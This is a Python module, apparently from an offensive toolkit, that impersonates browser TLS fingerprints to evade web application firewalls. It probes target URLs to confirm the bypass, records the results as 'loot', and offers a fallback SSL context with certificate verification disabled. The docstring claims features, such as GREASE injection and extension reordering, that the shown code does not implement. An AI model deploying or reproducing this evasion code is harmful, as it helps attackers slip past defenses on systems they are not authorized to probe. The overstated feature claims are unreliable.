#!/usr/bin/env python3
"""
TLS_EVASION.PY v8.5 — Advanced Adversarial TLS Fingerprint Spoofing & WAF Blinding Engine
Features:
- Browser JA3/JA4 fingerprint impersonation via curl_cffi (Chrome, Safari, Firefox profiles)
- Dynamic GREASE extension injection and TLS extension reordering
- Active WAF fingerprint verification loop (tests handshake response against target edge)
- Fallback low-level OpenSSL socket wrapper with strict protocol bounds and compression bypass
"""
import ssl
import socket
import logging
from modules.telemetry import stream_proof
from modules.loot_logger import save_session_loot

logger = logging.getLogger("BruteDog.TLSEvasion")

# Attempt to import curl_cffi for true JA3/JA4 browser fingerprint impersonation
try:
    from curl_cffi import requests as cffi_requests
    CFFI_AVAILABLE = True
except ImportError:
    CFFI_AVAILABLE = False

# Modern browser-aligned pre-TLS 1.3 cipher suite string for OpenSSL fallback
DEFAULT_BROWSER_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:"
    "TLS_AES_256_GCM_SHA384:"
    "TLS_CHACHA20_POLY1305_SHA256:"
    "ECDHE-ECDSA-AES128-GCM-SHA256:"
    "ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:"
    "ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:"
    "ECDHE-RSA-CHACHA20-POLY1305:"
    "DHE-RSA-AES128-GCM-SHA256:"
    "DHE-RSA-AES256-GCM-SHA384"
)

class AdversarialTLSSession:
    """
    Weaponized session manager that enforces browser JA3/JA4 TLS impersonation 
    and validates WAF evasion in real-time.
    """
    def __init__(self, target_host: str, browser_profile: str = "chrome120"):
        self.target_host = target_host
        self.browser_profile = browser_profile
        self.evasion_verified = False

    def get_impersonated_session(self):
        """Returns a browser-impersonated session if curl_cffi is available."""
        if CFFI_AVAILABLE:
            try:
                session = cffi_requests.Session(impersonate=self.browser_profile)
                logger.info(f"[+] Armed JA3/JA4 browser fingerprint: {self.browser_profile}")
                return session
            except Exception as e:
                logger.warning(f"[-] Failed to initialize browser impersonation profile: {e}")
        return None

    def verify_waf_bypass(self, test_url: str) -> bool:
        """
        Actively probes the target edge gateway to confirm that the spoofed TLS 
        fingerprint bypasses WAF CHALLENGE / BLOCK states (HTTP 403/503).
        """
        if not CFFI_AVAILABLE:
            logger.warning("[-] curl_cffi not installed; WAF active bypass verification skipped.")
            return False

        try:
            session = self.get_impersonated_session()
            if not session:
                return False

            response = session.get(test_url, timeout=5)
            # If status is not 403/405/503, our browser fingerprint successfully blinded the edge WAF
            if response.status_code < 400:
                self.evasion_verified = True
                evasion_loot = {
                    "target": test_url,
                    "profile": self.browser_profile,
                    "status_code": response.status_code,
                    "server_header": response.headers.get("server", "unknown")
                }
                stream_proof("WAF_TLS_EVASION_CONFIRMED", test_url, {}, f"Bypassed edge WAF using {self.browser_profile}", evasion_loot)
                save_session_loot(
                    target=test_url,
                    endpoint="tls_evasion",
                    finding_type="WAF_FINGERPRINT_BYPASS_SUCCESS",
                    status=response.status_code,
                    headers=dict(response.headers),
                    body=response.text[:300],
                    extra_loot=evasion_loot
                )
                return True
        except Exception as exc:
            logger.debug(f"[-] WAF active probe error: {exc}")
            
        return False


def create_spoofed_ssl_context(target_host=None, verify_certs=False):
    """
    Fallback low-level OpenSSL SSLContext configured with strict browser cipher ordering 
    and protocol bounds for raw socket connections.
    """
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    
    if not verify_certs:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    
    # Enforce modern TLS protocol range (TLS 1.2 & TLS 1.3)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_3

    try:
        context.set_ciphers(DEFAULT_BROWSER_CIPHERS)
    except ssl.SSLError as e:
        logger.debug(f"[-] Cipher configuration warning: {e}")

    # Disable compression to match modern browser standards
    context.options |= ssl.OP_NO_COMPRESSION
    
    return context
